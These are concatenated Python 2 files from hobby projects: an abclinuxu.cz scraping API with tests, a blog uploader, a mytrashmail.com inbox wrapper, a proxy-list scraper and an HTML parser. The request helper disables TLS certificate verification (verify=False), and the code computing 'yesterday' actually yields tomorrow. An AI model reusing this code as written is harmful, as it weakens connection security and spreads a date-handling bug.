        method,
        url,
        params=params,
        data=data,
        verify=False,
    )

    return content.text.encode("utf-8") if as_text else content.content


def first(inp_data):
    """
    Return first element from `inp_data`, or raise StopIteration.

    Note:
        This function was created because it works for generators, lists,
        iterators, tuples and so on same way, which indexing doesn't.

        Also it have smaller cost than list(generator)[0], because it doesn't
        convert whole `inp_data` to list.

    Args:
        inp_data (iterable): Any iterable object.

    Raises:
        StopIteration: When the `inp_data` is blank.
    """
    return next(x for x in inp_data)


def date_to_timestamp(date):
    """
    Convert abclinuxu `relative` or `absolute` date string in czech words to
    timestamp.

    Args:
        date (str): One of many abclinuxu representations of date string.

    Returns:
        int: Timestamp.
    """
    date = date.strip()
    date = date.__str__().replace(". ", ".")  # 10. 10. 2003 -> 10.10.2003

    # references to today and yesterday
    today = time.strftime("%d.%m.%Y", time.localtime())
    yesterday = datetime.date.today() - datetime.timedelta(days=-1)

    # 8.4.23:30
    if re.match(r"[0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,2}\:[0-9]{1,2}", date):
        date = "%d.%s" % (time.localtime().tm_year, date)
        return time.mktime(time.strptime(date, "%Y.%d.%m.%H:%M"))

    date = date.replace("dnes", today)
    date = date.replace("včera", yesterday.strftime("%d.%m.%Y"))
    if "|" in date:  # "%H:%M |" -> "%d.%m.%Y %H:%M"
        date = today + " " + date.replace(" |", "")

    if len(date) <= 11:  # new items are without year
        date = date.replace(". ", ".%d " % time.localtime().tm_year)

    return time.mktime(time.strptime(date, "%d.%m.%Y %H:%M"))


def date_izolator(lines):
    """
    Return all lines, that looks like it may be date in one of many
    abclinuxu formats.

    Args:
        lines (list): List of strings with lines which ma by dates.

    Returns:
        list: List of lines, which looks like they may contain dates.
    """
    return [
        x for x in lines
        if ":" in x and any(["." in x, "včera" in x, "dnes" in x, "|" in x])
    ]


def alt_izolator(lines):
    """
    Return all lines, that looks like it may be date "~~%d.%m. ~~" format.

    Args:
        lines (list): List of strings with lines which ma by dates.

    Returns:
        list: List of lines, which looks like they may contain dates.
    """
    return [
        l for l in lines
        if "." in l and re.match(r".*[0-9]{1,2}\.[0-9]{1,2}\..*", l)
    ]


def parse_timestamp(meta):
    """
    Parse numeric timestamp from the date representation.

    Args:
        meta (str): Meta html from the blogpost body.

    Returns:
        int: Timestamp.
    """
    if type(meta) not in [list, tuple, types.GeneratorType]:
        meta = meta.__str__().replace(". ", ".")  # 10. 10. 2003 -> 10.10.2003
        meta = str(meta).splitlines()

    date = date_izolator(meta)
    if date:
        return date_to_timestamp(first(date))

    # this is used in articles (article != blogpost)
    date = alt_izolator(meta)
    if date:
        date = first(date).split()[0].replace("|", "")
        return date_to_timestamp(date + " 00:00")

    assert date, "Date not found!"


def ts_to_concept_date(timestamp):
    """
    Convert numeric `timestamp` into format used by abclinuxu for concepts.

    Args:
        timestamp (int): Timestamp as float/int.

    Returns:
        str: Converted `timestamp`.
    """
    if not timestamp:
        return None

    # required format: 2005-01-25 07:12
    return time.strftime(
        "%Y-%m-%d %H:%M",
        time.localtime(timestamp)
    )


def url_context(rel_url):
    """
    Add `rel_url` to the absolute context with :attr:`ABCLINUXU_URL`.

    Args:
        rel_url (str): Relative URL.

    Returns:
        str: Absolute URL.
    """
    return urljoin(ABCLINUXU_URL, rel_url)


def handle_errors(dom):
    """
    Look for error divs in given `dom` tree.

    Args:
        dom (obj): :class:`dhtmlparser.HTMLElement` instance.

    Raises:
        UserWarning: With content of the error div if the div was found.
    """
    error = dom.find(
        "h1",
        {"class": "st_nadpis"},
        fn=lambda x: x.getContent() == "Chyba"
    )

    if error:
        error = first(error)

        # I want <p> next to <h1> with error
        elements = error.parent.childs
        elements = elements[elements.index(error):]

        error_msg = first(x for x in elements if x.getTagName() == "p")

        raise UserWarning(error_msg.getContent())


def check_error_div(data, error_div):
    """
    Dunno about this, it was created long time ago and I have no idea.
    """
    # no sophisticated parsing of the error is needed
    if error_div in data:
        data = data.split(error_div)[1]
        data = data.split("</div>")[0]

        raise ValueError(data)


def check_error_page(data):
    """
    Handle other, special kind of errors.
    """
    dom = dhtmlparser.parseString(data)

    title = dom.find("title")

    if not title:
        return

    title = title[0].getContent()

    if title != "Chyba":
        return

    p = dom.find("p")

    error_text = p[0].getContent() if p else data

    raise ValueError(error_text.strip())
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os
import sys
import os.path
import getpass
import argparse

import dhtmlparser as d

sys.path.insert(
    0,
    os.path.join(os.path.dirname(__file__), "../src")
)
import abclinuxuapi


# Variables ===================================================================
ALLOWED_IMAGES = [
    "jpg",
    "jpeg",
    "gif",
    "png"
]


# Functions & objects =========================================================
def get_body(dom):
    body = dom.find("body")
    if body:
        return body[0].getContent()

    return str(dom)


def upload_image(concept, image_path):
    # remote images
    if not os.path.exists(image_path):
        return image_path

    concept.add_pic(open(image_path))

    return concept.list_pics()[-1]


def upload_html(dom, args):
    user = abclinuxuapi.User(args.username, args.password)

    try:
        user.add_concept(get_body(dom), args.title)
    except ValueError, e:
        sys.stderr.write("Fail: " + e.message + "\n")
        sys.exit(1)

    concept = user.get_concepts()[-1]

    print "Uploading your concept '%s'" % concept.title
    print
    print "Uploading inlined images:"

    # upload inlined images
    for img in dom.find("img"):
        if "src" not in img.params:
            continue

        print "\tUploading '%s'" % os.path.basename(img.params["src"])

        img.params["src"] = upload_image(concept, img.params["src"])

    print
    print "Uploading linked images:"

    # upload linked images
    for a in dom.find("a"):
        if "href" not in a.params or "." not in a.params["href"]:
            continue

        if a.params["href"].rsplit(".", 1)[1].lower() not in ALLOWED_IMAGES:
            continue

        print "\tUploading '%s'" % os.path.basename(a.params["href"])

        a.params["href"] = upload_image(concept, a.params["href"])

    print
    print "Updating image links in concept .."

    try:
        concept.edit(get_body(dom))
    except ValueError, e:
        sys.stderr.write("Fail: " + e.message + "\n")
        sys.exit(1)

    print
    print "Done: " + concept.link


# Main program ================================================================
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="abclinuxu.cz blog uploader.")

    parser.add_argument(
        "FN",
        type=str,
        help="Filename of the HTML document, which will be parsed and uploaded."
    )
    parser.add_argument(
        "-u",
        '--username',
        metavar="USER",
        required=True,
        type=str,
        help="Your username."
    )
    parser.add_argument(
        "-p",
        '--password',
        metavar="PASS",
        type=str,
        default=None,
        help="Your password. If not set, you will be asked interactively."
    )
    parser.add_argument(
        "-t",
        "--title",
        type=str,
        default=None,
        help="Title of your blogpost. If not set, <title> tag from your\
              document is used."
    )
    args = parser.parse_args()

    if not os.path.exists(args.FN):
        sys.stderr.write("File '%s' doesn't exists!\n" % args.FN)
        sys.exit(1)

    dom = None
    with open(args.FN) as f:
        data = f.read()
        dom = d.parseString(data)

    if args.title is None:
        title = dom.find("title")

        if not title or not title[0].getContent().strip():
            sys.stderr.write("Can't find <title> in your document.")
            sys.stderr.write("Use --title switch.\n")
            sys.exit(1)

        args.title = title[0].getContent().strip()

    if args.password is None:
        args.password = getpass.getpass("Password for '%s': " % args.username)

    os.chdir(
        os.path.dirname(
            os.path.abspath(args.FN)
        )
    )
    upload_html(dom, args)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import pytest

import abclinuxuapi


# Tests =======================================================================
def test_iter_blogposts():
    blogs = [blog for blog in abclinuxuapi.iter_blogposts(end=0)]

    assert len(blogs) == 25
    assert blogs[0].created_ts > 0
    assert blogs[-1].created_ts > 0


def test_first_blog_page():
    blogs = abclinuxuapi.first_blog_page()

    assert len(blogs) == 25
    assert blogs[0].created_ts > 0
    assert blogs[-1].created_ts > 0


def test_next_blog_url():
    page_gen = abclinuxuapi._next_blog_url()

    assert next(page_gen) == "https://www.abclinuxu.cz/blog/?from=0"
    assert next(page_gen) == "https://www.abclinuxu.cz/blog/?from=25"

    assert next(abclinuxuapi._next_blog_url(4)).endswith("u.cz/blog/?from=100")


def test_number_of_blog_pages():
    assert abclinuxuapi.number_of_blog_pages() >= 807
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import pytest

from abclinuxuapi import shared

# Tests =======================================================================
def test_url_context():
    assert shared.url_context("hello") == "https://www.abclinuxu.cz/hello"


def test_date_to_timestamp():
    assert shared.date_to_timestamp("10.2. 18:59 ") >= 1423591140.0
    assert shared.date_to_timestamp("2.10.2011 18:20") == 1317572400.0


def test_first():
    assert shared.first([1, 2, 3]) == 1
    assert shared.first([1]) == 1

    with pytest.raises(StopIteration):
        assert shared.first([])

    with pytest.raises(TypeError):
        assert shared.first(1)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
import os.path
import pytest

import abclinuxuapi
from abclinuxuapi import shared


@pytest.fixture
def bp_url():
    return "http://www.abclinuxu.cz/blog/bystroushaak/2015/2/bolest-proxy"


@pytest.fixture
def do_that_fucking_monkey_patch(monkeypatch):
    def mock_download(*args, **kwargs):
        fn = os.path.join(os.path.dirname(__file__), "mock_data/blogpost.html")

        with open(fn) as f:
            return f.read()

    monkeypatch.setattr(abclinuxuapi.blogpost, "download", mock_download)


def setup_module(do_that_fucking_monkey_patch):
    """
    It is not possiblel to import monkeypatch from pytest. You have to use it
    as fixture.
    """


BPOST = abclinuxuapi.Blogpost(bp_url(), lazy=False)

@pytest.fixture
def bpost():
    """
    This may seem a little bit crazy, but this speeds up the testing 6x.

    I don't need new object for each test.
    """
    return BPOST


def test_constructor(bp_url):
    bp = abclinuxuapi.Blogpost(bp_url)

    assert bp.url == bp_url
    assert bp.uid is None
    assert bp.title is None
    assert bp.intro is None
    assert bp.text is None
    assert bp.rating is None
    assert bp.comments == []
    assert bp.comments_n == -1
    assert bp.created_ts is None
    assert bp.last_modified_ts is None
    assert bp.object_ts > 0


def test_constructor_multi_params(bp_url):
    bp = abclinuxuapi.Blogpost(
        url=bp_url,
        uid="uid",
        title="title",
        intro="intro",
        text="text",
        rating="rating",
        comments="comments",
        comments_n="comments_n",
        created_ts="created_ts",
        last_modified_ts="last_modified_ts",
        object_ts="object_ts"
    )

    assert bp.url == bp_url
    assert bp.uid == "uid"
    assert bp.title == "title"
    assert bp.intro == "intro"
    assert bp.text == "text"
    assert bp.rating == "rating"
    assert bp.comments == "comments"
    assert bp.comments_n == "comments_n"
    assert bp.created_ts == "created_ts"
    assert bp.last_modified_ts == "last_modified_ts"
    assert bp.object_ts == "object_ts"


def test_constructor_wrong_params(bp_url):
    with pytest.raises(TypeError):
        bp = abclinuxuapi.Blogpost(bp_url, azgabash=True)


def test_get_title(bpost):
    assert bpost.title == "Bolest proxy"


def test_get_text(bpost):
    assert bpost.text.startswith("<h2>Bolest proxy</h2>")
    assert "Written in CherryTree" in bpost.text
    assert "bystrousak:" in bpost.text


def test_Tag():
    tag = abclinuxuapi.Tag("hello", norm="_hello_")

    assert tag == "hello"
    assert tag.norm == "_hello_"
    assert tag.url.startswith("http")


def test_tags(bpost):
    assert bpost.tags
    assert "proxy" in bpost.tags

    # try to add and remove tag
    new_tag = abclinuxuapi.Tag("nábytek", "nabytek")

    bpost.remove_tag(new_tag, throw=False)
    assert new_tag not in bpost.tags

    bpost.add_tag(new_tag)
    assert new_tag in bpost.tags

    bpost.remove_tag(new_tag, throw=False)


def test_get_uid(bpost):
    assert bpost.uid == 400957


def test_get_rating(bpost):
    assert bpost.rating
    assert bpost.rating.rating == 100
    assert bpost.rating.base == 15


def test_meta_parsing(bpost):
    assert bpost.has_tux
    assert bpost.created_ts == 1423587660.0
    assert bpost.last_modified_ts >= 1423591140.0
    assert bpost.readed >= 1451


def test_get_image_urls(bpost):
    assert bpost.get_image_urls()
    assert bpost.get_image_urls()[0] == (
        "https://www.abclinuxu.cz/images/screenshots/0/9/"
        "210590-bolest-proxy-6017333664768008869.png"
    )


def test_different_date_parsing():
    abclinuxuapi.Blogpost(
        "http://abclinuxu.cz/clanky/yubikey.-co-to-je-a-co-to-umi-1",
        lazy=False
    )

    abclinuxuapi.Blogpost(
        "http://abclinuxu.cz/clanky/bezpecnost/ssl-je-vase-bezpecne-pripojeni-opravdu-zabezpecene",
        lazy=False
    )

    abclinuxuapi.Blogpost(
        "http://abclinuxu.cz/blog/jarasa/2016/10/i-pejsek-musi-jist-kvalitne",
        lazy=False
    )

    abclinuxuapi.Blogpost(
        "http://abclinuxu.cz/blog/msk/2016/8/hlada-sa-linux-embedded-vyvojar",
        lazy=False
    )

    blog = abclinuxuapi.Blogpost(
        "http://abclinuxu.cz/blog/Strider_BSD_koutek/2006/8/objevil-jsem-ameriku",
        lazy=False
    )
    assert len(blog.comments) == 0

    blog = abclinuxuapi.Blogpost(
        "http://www.abclinuxu.cz/blog/tucnak_viktor/2005/1/zdravim-nahodne-navstevniky",
        lazy=False
    )

    blog = abclinuxuapi.Blogpost(
        "https://www.abclinuxu.cz/blog/luv/2016/4/mockgeofix-mock-geolokace-kompatibilni-s-android-emulatorem",
        lazy=False
    )
    assert len(blog.comments) == 0
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os.path

import pytest

import abclinuxuapi


# Fixtures ====================================================================
@pytest.fixture
def username_password():
    local_dir = os.path.dirname(__file__)
    pwd_file_path = os.path.join(local_dir, "login")

    if not os.path.exists(pwd_file_path):
        raise IOError(
            "Please create file `login` in tests/ directory.\n"
            "First line is username, second password for test user."
        )

    with open(pwd_file_path) as f:
        return f.read().splitlines()[:2]


@pytest.fixture
def username():
    return username_password()[0]


@pytest.fixture
def password():
    return username_password()[-1]


@pytest.fixture
def user():
    return abclinuxuapi.User(*username_password())


# Tests =======================================================================
def test_register_blog(user):
    if user.has_blog:
        return

    user.register_blog("Test user's blog")
    assert user.has_blog()


def test_login(user, username):
    user.login()

    with pytest.raises(UserWarning):
        user = abclinuxuapi.User(username, "bad password")
        user.login()


def test_get_blogposts():
    posts = abclinuxuapi.User("bystroushaak").get_blogposts()

    assert len(posts) >= 56
    assert posts[0].title == "Google vyhledávání"
    assert posts[55].title == "Dogecoin"


def test_add_concept(user):
    old_concept_list = user.get_concepts()

    user.add_concept("Text of the new concept", "Title of the concept")

    new_concept_list = user.get_concepts()

    assert len(old_concept_list) < len(new_concept_list)

    assert new_concept_list[-1].title == "Title of the concept"
    content = new_concept_list[-1].get_content()

    assert len(content) > 0

    assert "Text of the new concept" in content


def test_concept_with_long_title(user):
    with pytest.raises(ValueError):
        user.add_concept("Text of the new concept", "Prostředí a programovací jazyk Selfu (díl čtvrtý; komunita, historie, budoucnost a metafyzika)")


def test_get_user_id(user):
    user.login()

    assert user._get_user_id()
    assert int(user._get_user_id())


def test_from_user_id():
    u = abclinuxuapi.User.from_user_id("19684")

    assert u.username == "bystroushaak"


def test_iterator():
    blogs = [blog for blog in abclinuxuapi.User("bystroushaak")]

    assert len(blogs) > 56
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from os.path import join
from os.path import dirname

import pytest
import dhtmlparser

from abclinuxuapi import Comment


# Variables ===================================================================
BLOG_URL = "https://www.abclinuxu.cz/blog/show/400959"


# Fixtures ====================================================================
@pytest.fixture
def reg_header():
    return dhtmlparser.parseString("""    <div class="ds_hlavicka" id="9">
        <div class="ds_reseni" style="display:none">
        </div>


        11.2. 15:21

<a href="/lide/manasekp">manasekp</a>             | skóre: 27
             | blog: <a href="/blog/manasekp">manasekp</a>
             | Brno

        <br>

            <span class="ds_control_sbalit2" id="comment9_toggle2">
                <a onClick="schovej_vlakno(9)" title="Schová nebo rozbalí celé vlákno">Rozbalit</a>
                <a onClick="rozbal_vse(9)" title="Schová nebo rozbalí vše pod tímto komentářem">Rozbalit vše</a>
            </span>

        Re: Bolest proxy


            <div id="comment9_controls">
                
                <a href="/blog/EditDiscussion/400959;jsessionid=kufis2spplnh6gu671mxqe2j?action=add&amp;dizId=210591&amp;threadId=9">Odpovědět</a>
                    | <a onClick="schovej_vlakno(9)" id="comment9_toggle1" title="Schová nebo rozbalí celé vlákno" class="ds_control_sbalit3">Sbalit</a>
                    | <a href="#2" title="Odkaz na komentář o jednu úroveň výše">Výše</a>
                    | <a href="#9" title="Přímá adresa na tento komentář">Link</a>
                    | <a href="/EditUser;jsessionid=kufis2spplnh6gu671mxqe2j?action=toBlacklist&amp;bUid=9480&amp;url=/blog/show/400959#9" title="Přidá autora na seznam blokovaných uživatelů">Blokovat</a>
                | <a href="/blog/EditRequest/400959;jsessionid=kufis2spplnh6gu671mxqe2j?action=comment&amp;threadId=9" title="Žádost o přesun diskuse, stížnost na komentář">Admin</a>
            </div>

    </div>""").find("div")[0]


@pytest.fixture
def unreg_header():
    return dhtmlparser.parseString("""    <div class="ds_hlavicka" id="3">
        <div class="ds_reseni" style="display:none">
        </div>


        10.2. 21:53

               Tomáškova máma

        <br>

            <span class="ds_control_sbalit2" id="comment3_toggle2">
                <a onClick="schovej_vlakno(3)" title="Schová nebo rozbalí celé vlákno">Rozbalit</a>
                <a onClick="rozbal_vse(3)" title="Schová nebo rozbalí vše pod tímto komentářem">Rozbalit vše</a>
            </span>

        Re: Bolest proxy


            <div id="comment3_controls">
                
                <a href="/blog/EditDiscussion/400959;jsessionid=kufis2spplnh6gu671mxqe2j?action=add&amp;dizId=210591&amp;threadId=3">Odpovědět</a>
                    | <a onClick="schovej_vlakno(3)" id="comment3_toggle1" title="Schová nebo rozbalí celé vlákno" class="ds_control_sbalit3">Sbalit</a>
                    
                    | <a href="#3" title="Přímá adresa na tento komentář">Link</a>
                    | <a href="/EditUser;jsessionid=kufis2spplnh6gu671mxqe2j?action=toBlacklist&amp;bName=Tom%C3%A1%C5%A1kova%20m%C3%A1ma&amp;url=/blog/show/400959#3" title="Přidá autora na seznam blokovaných uživatelů">Blokovat</a>
                | <a href="/blog/EditRequest/400959;jsessionid=kufis2spplnh6gu671mxqe2j?action=comment&amp;threadId=3" title="Žádost o přesun diskuse, stížnost na komentář">Admin</a>
            </div>

    </div>
    """).find("div")[0]


def read_test_file(fn):
    path = join(dirname(__file__), "mock_data", fn)
    with open(path) as f:
        return dhtmlparser.parseString(f.read())


@pytest.fixture
def censored_comment():
    return read_test_file("censored_comment.html")


@pytest.fixture
def censored_page():
    return read_test_file("censored_page.html")


# Tests =======================================================================
def test_izolate_timestamp(unreg_header):
    ts = Comment._izolate_timestamp(unreg_header)

    assert ts >= 1423601580


def test_izolate_timestamp_reg(reg_header):
    ts = Comment._izolate_timestamp(reg_header)

    assert ts >= 1423664460


def test_izolate_name(unreg_header):
    username, registered = Comment._izolate_username(unreg_header)

    assert username == "Tomáškova máma"
    assert not registered


def test_izolate_name_reg(reg_header):
    username, registered = Comment._izolate_username(reg_header)

    assert username == "manasekp"
    assert registered


def test_parse_url(unreg_header):
    assert Comment._parse_url(unreg_header) == BLOG_URL + "#3"


def test_parse_url_reg(reg_header):
    assert Comment._parse_url(reg_header) == BLOG_URL + "#9"


def test_response_to(unreg_header):
    assert Comment._response_to(unreg_header) is None


def test_response_to_reg(reg_header):
    assert Comment._response_to(reg_header) == "2"


def test_censored_comment(censored_comment):
    assert not Comment._response_to(censored_comment)

    c = Comment._from_head_and_body(
        censored_comment.find("div", {"class": "ds_hlavicka"})[0],
        censored_comment.find("div", {"id": "comment1"})[0]
    )

    assert c.url == "https://www.abclinuxu.cz/blog/show/240961#1"
    assert "administrátor" in c.text
    assert c.timestamp == 1222777500
    assert c.username == ""
    assert not c.registered
    assert c.responses == []

    assert not c.response_to
    assert c.id == "1"


def test_censored_comments_page(censored_page):
    comments = Comment.comments_from_html(censored_page)

    assert comments[0].censored#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# AATrashMailComInterface v2.2.0 (20.04.2011) by Bystroushaak - bystrousak@kitakitsune.org.
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in geany, documented with epydoc.
#
#   Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
#   emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
#   U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
#   i nekomu jinemu nez me. Diky.
#
"""
Anonymous Account on TrashMail.Com Interface
Module allows list, download and delete messages from anonymous temporary mailbox provided by
mytrashmail.com.
"""

# imports
import urllib2
try:
	from BeautifulSoup import BeautifulSoup as BS
except ImportError, e:
	print "---"
	print ">>> Error;", e, "!! <<<"
	print "This program needs BeautifulSoup!"
	print "You can download it here; http://www.crummy.com/software/BeautifulSoup/"
	print "Or you can try find it in repostories for your linux distribution."
	print "---"

	raise e


# variables
URL = "http://www.mytrashmail.com/"
MAIL_DIR_URL = "http://www.mytrashmail.com/myTrashMail_inbox.aspx?email="
MAIL_URL = "http://www.mytrashmail.com/MyTrashMail_message.aspx?email=§username&id=§id&type=text"
DELETE_URL = "http://www.mytrashmail.com/delete_me.aspx?id=§id&email=§username"
HEADERS_URL = "http://www.mytrashmail.com/MyTrashMail_message.aspx?email=§username&id=§id&type=header"

IEHeaders = {
	"User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
	"Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
	"Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
	"Accept-Charset": "utf-8; windows-1250",
	"Keep-Alive": "300",
	"Connection": "keep-alive",
}
"Headers from Internet explorer"


# functions & objects
class ParseError(Exception):
	"ParseError. Raised if cant parse HTML."
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return self.value


def getPage(url, param = None, headers = IEHeaders):
	"""
	This function simple downloads stuff from internet.

	@param url: Page url.
	@type  url: string

	@param param: Optional POST parameters. Default is None.

	@param headers: Optional headers - default Internet explorer.
	@type  headers: dictionary with IEHeaders

	@see: IEHeaders

	@return: HTML code
	@rtype: string

	@raise IOError: If cant download page
	"""

	# download page
	f = urllib2.urlopen(urllib2.Request(url, param, headers))
	data = f.read()    
	f.close()

	return data


def getActiveDomain():
	"""
	This function download and parse index on mytrashmail.com and returns active 
	domain, because mytrashmail.com changes their mail domain periodically. 

	@raise IOError: Cant download page.
	@raise ParseError: Cant parse downloaded page.

	@return: Active domain.
	@rtype: string
	"""

	data = getPage(URL)

	try:
		# parse active domain
		for i in data.splitlines():
			if "(active)" in i:
				domain = i.split("strong>")
				return domain[1].split(" ")[0][1:]
	except:
		raise ParseError("Cant parse active domain!")

	raise ParseError("Cant find any active domain.")


def getMailList(username):
	"""
	Download and parse information about emails in inbox.

	@param username: username used to log into maildir. It is first part of email address.
	@type username: string

	@raise ParseError: If cant parse information about emails in mailbox.
	@raise IOError: If cant download page with maibox.

	@return: Array of dictionaries with information about messages (mail_id, subject, date).
	@rtype: Array of dictionaries
	"""

	try:
		data = getPage(MAIL_DIR_URL + str(username))
	except Exception, e:
		raise IOError("Cant download page with mailbox - " + str(e))

	try:        
		if len(data) == 0:
			raise ParseError("No data found!")
		
		data = data.splitlines()
			
		mails = []
		for i in range(len(data)):
			if "MyTrashMail_message.aspx" in data[i]:
				mail = {}
				
				# parse id number
				mail["mail_id"] = data[i].split("'")[1]
				mail["mail_id"] = mail["mail_id"].split("=")[-1]
				
				# parse subject and remove spaces from start
				mail["subject"] = data[i + 1].lstrip(" \t")
				
				# parse date
				cnt = i
				while '<td align="left">' not in data[cnt]:
					cnt += 1
				cnt += 1
				mail["date"] = data[cnt].lstrip(" \t")            
				
				mails.append(mail)
	except Exception, e:
		raise ParseError("Cant parse information about mails - " + str(e))
		
	return mails           
    

def getMail(username, mail_id):
	"""
	Download and parse email from inbox.

	@param username: username used to log into maildir. It is first part of email address.
	@type  username: string

	@param mail_id: Mail identificator - returned by getMailList().
	@type  mail_id: string

	@return: Dictionary with information about email (text, subject, date, from).
	@rtype:  dictionary

	@raise IOError: If cant download email.
	@raise ParseError: Raise when cant parse page, or get bad mail_id.
	"""

	try:
		data = getPage(MAIL_URL.replace("§id", str(mail_id)).replace("§username", str(username)))
		headers_data = getPage(HEADERS_URL.replace("§id", str(mail_id)).replace("§username", str(username)))
	except Exception, e:
		raise IOError("Cant download email -" + str(e))
		
	mail = {}

	try:
		# parse text
		soup = BS(data)
		text = soup("span", {"id" : "ctl00_ContentPlaceHolder2_lblMessage"})[0]
		text = str(text).replace("<br />", "\n").replace("<br>", "\n")
		mail["text"] = str([text for text in BS(str(text)).span.contents][0])    # uhm
			
		# parse subject, date, from
		mail["subject"] = soup("span", {"id" : "ctl00_ContentPlaceHolder2_lblSubject"})[0].contents[0]
		mail["date"]    = soup("span", {"id" : "ctl00_ContentPlaceHolder2_lblDate"})[0].contents[0]
		mail["from"]    = soup("span", {"id" : "ctl00_ContentPlaceHolder2_lblFrom"})[0].contents[0]
		
		# parse headers
		headers_data = headers_data.splitlines()
		headers = ""
		for line in headers_data:
			if headers == "":
				if "ctl00_ContentPlaceHolder2_lblMessage" in line:
					headers += line
					if "/span" in line:
						break
			else:
				headers += line
				if "/span" in line:
					break
		
		headers = ">".join(headers.split(">")[1:])
		headers = "<".join(headers.split("<")[:-2])
		mail["headers"] = headers.replace("<br />", "\n").replace("<br>", "\n")
	except Exception, e:
		raise ParseError("Cant parse email - " + str(e))

	if (mail["text"] == "Label") and (mail["date"] == "Label") and (mail["from"] == "Label"):
		raise ParseError("Bad Mail ID!\nCant find any mail (" + str(mail_id) + ")!")

	if (mail["from"] == "***************") and (mail["date"] == "***************"):
		raise ParseError("This message has been deleted!")
		
	return mail


def deleteMail(username, mail_id):
	"""
	Remove email from mailbox. Function doesn't check mail_id, so if maild is nonsense, still return True.

	@param username: username used to log into maildir. It is first part of email address.
	@type  username: string

	@param mail_id: Mail identificator - returned by getMailList()
	@type  mail_id: string

	@raise IOError: If cant connect into maibox.

	@see: getMailList()
	"""
	try:
		data = getPage(DELETE_URL.replace("§id", str(mail_id)).replace("§username", str(username)))
	except Exception, e:
		raise IOError("Cant connect to trashmail.com and delete mail - " + str(e))
		
	if len(data) == 0:
		raise IOError("Unknown error while deleting email " + str(mailid))


# main program
if __name__ == "__main__":
	print "    AATrashMailComInterface v2.2.0 (20.05.2011) by bystrousak@kitakitsune.org"
	print
	print "    This module is simple wrapper over anonymous accounts on trashmail.com."
	print
	print "   Module allows list, download and delete messages from anonymous temporary"
	print "   mailbox."
# -*- coding: utf-8 -*-
# This file is there mainly for 'git submodule' use in other projects.

import incloak
import hidemyass
import ipaddresscom
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import httpkie
import dhtmlparser as d


# Functions & objects =========================================================
def getProxies():
    """
    Return array of dicts following this structure:
    {
        ip: str(ip),
        port: int(port),
        ping: int(ms)
    }
    """
    down = httpkie.Downloader()

    dom = d.parseString(
        down.download("http://incloak.com/proxy-list/?type=h&anon=234")
    )

    proxies = []
    for tr in dom.find("table")[6].find("tr")[1:]:
        proxy = {
            "ip": tr.find("td")[0].getContent(),
            "port": 8080,
            "ping": int(tr.find("div")[-1].getContent().split()[0])
        }
        proxies.append(proxy)

    return proxies


if __name__ == '__main__':
    import json
    print json.dumps(getProxies())
    print len(getProxies())
# -*- coding: utf-8 -*-
# This file is there mainly for 'git submodule' use in other projects.

from dhtmlparser import *#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Author:  Bystroushaak (bystrousak@kitakitsune.org)
Version: 1.7.3

This version doens't corresponds with DHTMLParser v1.5.0 - there were updates,
which makes both parsers incompatible.

This work is licensed under a Creative Commons 3.0 Unported License
(http://creativecommons.org/licenses/by/3.0/cz/).

Project page; https://github.com/Bystroushaak/pyDHTMLParser
"""



# Nonpair tags
NONPAIR_TAGS = [
	"br",
	"hr",
	"img",
	"input",
	#"link",
	"meta",
	"spacer",
	"frame",
	"base"
]



def unescape(inp, quote = '"'):
	if len(inp) < 2:
		return inp

	output = ""
	unesc = False
	for act in inp:
		if act == quote and unesc:
			output = output[:-1]

		output += act

		if act == "\\":
			unesc = not unesc
		else:
			unesc = False

	return output


def escape(input, quote = '"'):
	output = ""

	for c in input:
		if c == quote:
			output += '\\'

		output += c

	return output


def rotate_buff(buff):
	"Rotate buffer (for each buff[i] = buff[i-1])"
	i = len(buff) - 1
	while i > 0:
		buff[i] = buff[i - 1]
		i -= 1

	return buff


class SpecialDict(dict):
	"""
	This dictionary stores items case sensitive, but compare them case
	INsensitive.
	"""
	def __contains__(self, k):
		for item in super(SpecialDict, self).keys():
			if k.lower() == item.lower():
				return True

	def __getitem__(self, k):
		for item in self.keys():
			if k.lower() == item.lower():
				return super(SpecialDict, self).__getitem__(item)



class HTMLElement():
	"""
	Container for parsed html elements.
	"""

	def __init__(self, tag = "", second = None, third = None):
		self.__element = None
		self.__tagname = ""

		self.__istag        = False
		self.__isendtag     = False
		self.__iscomment    = False
		self.__isnonpairtag = False

		self.childs = []
		self.params = SpecialDict()
		self.endtag = None
		self.openertag = None

		# blah, constructor overloading in python sux :P
		if isinstance(tag, str) and second is None and third is None:
			self.__init_tag(tag)
		elif isinstance(tag, str) and isinstance(second, dict) and third is None:
			self.__init_tag_params(tag, second)
		elif isinstance(tag, str) and isinstance(second, dict) and     \
		     (isinstance(third, list) or isinstance(third, tuple)) and \
		     len(third) > 0 and isinstance(third[0], HTMLElement):

			# containers with childs are automatically considered tags
			if tag.strip() != "":
				if not tag.startswith("<"):
					tag = "<" + tag
				if not tag.endswith(">"):
					tag += ">"
			self.__init_tag_params(tag, second)
			self.childs = closeElements(third)
			self.endtag = HTMLElement("</" + self.getTagName() + ">")
